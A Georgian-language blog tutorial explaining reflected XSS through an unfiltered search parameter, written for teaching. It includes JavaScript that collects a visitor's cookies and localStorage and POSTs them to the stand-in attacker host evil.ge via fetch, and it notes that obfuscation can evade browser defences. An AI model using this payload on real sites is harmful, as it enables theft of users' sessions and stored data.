---
title: "Reflected XSS შეტევები"
date: 2024-11-11 16:02:00 +0400
categories: [CyberSecurity, Guides]
tags: [Explanation]
---

## ფიშინგი?

საკმაოდ საინტერესოა `Reflected XSS` შეტევები. ზოგადად, რა არის`XSS`? `XSS` არის `Cross-Site Scripting`, რაც იდეაში მოისაზრებს `JavaScript`-ის კოდის ფრონტზე ინექციას.

ანუ, გამოდის, რომ `XSS` შეტევისას, მანიპულაცია ხდება საიტის `JavaScript` კოდზე.

ახლა, რა შუაშია `ფიშინგი`? როდესაც საქმე `Reflected XSS` შეტევასთან გვაქვს, აქ უმეტეს შემთხვევაში მომხმარებლის მოტყუებასთან მიდის საქმე.

სანამ ფიშინგის მაგალითს განვიხილავ, ჯერ უნდა ავხსნა თუ როგორ მუშაობს `XSS` შეტევა.

## URL პარამეტრები

`URL` პარამეტრები არის ცვლადები, რომლებიც გადაეცემა საიტის `Backend`-ს, შემდგომი დამუშავებისათვის. მაგალითად, თუ საიტს აქვს `Login` სისტემა, `URL` შესაძლოა იყოს ასეთი:

```
http://example.com/login.php?username=admin&password=admin
```

აქ ორი პრობლემაა:

1. საიტი არის დაუშიფრავი, ანუ `http://` არის გამოყენებული და `MiTM`-ის შედეგად შესაძლებელია ინფორმაციის ამოღება.
2. მომხმარებლის სახელი და პაროლი `URL`-ში დევს, რის გამოც სულ, რომ `https://` ტრაფიკი იყოს და `SSL/TLS` იცავდეს ინფორმაციას, `URI`-ში მაინც გამოჩნდება მომხმარებლის სახელი და პაროლი.

ამ პრობლემის მოგვარება ასე შეგვიძლია: ავაწყოთ `JSON` მონაცემები და ჩავსვათ `Body`-ში:

```
----
...Headers...
----

{
	"username": "admin",
	"password": "admin"
}
```

ეს კიდევ უკეთესია. მაგრამ აქ ახლა საერთოდ სხვა რამეს განვიხილავ. საქმე ისაა, რომ თუ ჰაკერმა შეძლო ამ პარამეტრებში `JS` კოდის ინექცია და საიტზე მანიპულაცია, მაშინ თუ ის ლინკს გაუგზავნის სამიზნეს, ის ზიანს მიიღებს.

#### მაგალითი

დავუშვათ, მოცემულია `Search` ფორმა, სადაც შეიძლება ჩაიწეროს ტექსტი და ამ ტექსტის მიხედვით მონაცემთა ბაზიდან წამოვიდეს შესაბამისი პროდუქცია/პოსტები ან ა.შ.

რა თქმა უნდა, `SQLi`-ც შეიძლება გაიპაროს, მაგრამ ახლა `XSS` განვიხილოთ. იმ შემთხვევაში, თუ დეველოპერმა ვერ გაფილტრა მომხმარებლის მიერ შეყვანილი ინფორმაცია სწორად, მაშინ შეიძლება `JS` კოდის ჩაწერა.

```javascript
alert("XSS");
```

ეს, რომ ჩაიწეროს ძებნის ველში, ამოხტება `Pop-Up`, რომელიც გამოიტანს ტექსტს:

```
XSS
```

ეს კიდევ არაფერი, ძალიან მარტივი მაგალითია. თუ ამან იმუშავა, მაშინ ნებისმიერი `JS` კოდი იმუშავებს.

ახლა `Cookie`-ების და `LocalStorage Item`-ების მოპარვა ვცადოთ:

```javascript
const cookies = document.cookie;
let localStorageValues = [];

for(let counter = 0; counter < localStorage.length; counter++){
	const key = localStorage.key();

	const value = localStorage.getItem(key);
	localStorageValues.push({ key, value });
}
```

ამ კოდს თუ `search`-ში ჩავწერთ, ამას მივიღებთ:

```
http://example.com/search.php?by=let localStorageValues = []; for(let counter = 0; counter < localStorage.length; counter++) { const key = localStorage.key(counter); const value = localStorage.getItem(key); localStorageValues.push({ key, value }); }
```

ამ შემთხვევაში, `fetch` ლოგიკა არ ჩამიშენებია, მაგრამ, რა თქმა უნდა მისი დამატებაც შესაძლებელია:

```javascript
/* კოდი */

const serializedLocalStorageValues = JSON.stringify(localStorageValues);

fetch("http://evil.ge", {
	method: "POST",
	headers: {
		"Content-Type": "application/json"
	},
	body: serializedLocalStorageValues
});
```

ამის დამატების შემდეგ, თუ მომხმარებელი გადავა ზემოთ მოცემულ ლინკზე, მისი `cookie`-ები და ის ინფორმაცია, რომელიც `localStorage`-ში ინახებოდა, გაიგზავნება `http://evil.ge`-ზე, `POST` მოთხოვნით.

რა თქმა უნდა, თანამედროვე ბრაუზერები იცავენ მომხმარებლებს ასეთი შემთხვევებისგან, მაგრამ კარგად აწყობილი ობფუსკაციით, მაინც შეიძლება მათი მოტყუება.
